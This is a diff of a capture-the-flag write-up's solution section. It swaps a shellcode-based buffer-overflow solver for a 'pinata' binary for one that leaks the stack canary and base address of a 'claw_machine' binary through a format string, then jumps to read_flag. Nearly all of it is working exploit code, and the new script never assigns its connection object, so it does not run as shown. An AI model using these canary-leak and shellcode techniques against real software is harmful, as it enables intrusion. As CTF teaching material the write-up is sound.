@@ -185,41 +185,39 @@ Since we know that the return value sits 2 spots after the canary on the stack w
 # Solution
 
 ```python
-#!/usr/bin/python3.8
 from pwn import *
-import warnings
-warnings.filterwarnings('ignore')
-context.arch = 'amd64'
-context.log_level = 'critical'
+elf = context.binary = ELF('./claw_machine', checksec=False)
+#context.terminal = ["alacritty",'-e','zsh','-c']
+#p = gdb.debug("./claw_machine",gdbscript='''
+    #break fb
+    #continue
+    #''')
+#p = process(level='error')
+#p = remote("IP", "PORT")
+p.recvuntil(b">> ")
+p.sendline(b'9')
+p.recvuntil(b">> ")
+p.sendline(b'y')
+p.recvuntil(b': ')
+p.sendline('%21$p %23$p'.encode())
+print(p.recvline())
+x = p.recvline().decode()
+canary = x[x.index("k",20)+2:]
+print(canary.split(" "))
+print("HERE:")
+elf.address = eval(canary.split(" ")[1].strip())-0x1552
+print(elf.address)
+p.recvline()
+payload = flat(
+    b'A'*72,
+    eval(canary.split(" ")[0]),
+    b"A"*8,
+    elf.symbols.read_flag
+)
+p.send(payload)
+p.recvline()
+p.recvline()
+p.recvline()
+p.interactive()
 
-fname = './pinata' 
-
-LOCAL = False
-
-if LOCAL:
-  r    = process(fname)
-else:
-  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
-  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
-  r    = remote(IP, PORT)
-
-sc = asm(shellcraft.execve('/bin/sh'))
-
-payload  = b'\xff\xe4'             # jmp esp opcode
-payload += b'\x90'*22
-payload += p64(0x00000000004016ec) # jmp rax
-payload += sc 
-
-r.recvuntil('>> ')
-r.sendline(payload)
-
-pause(1)
-r.sendline('cat flag*')
-print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
-```
-
-```console
-➜  htb git:(main) ✗ python solver.py 
-
-Flag --> HTB{f4k3_fl4g_f0r_writ3up}}
 ```
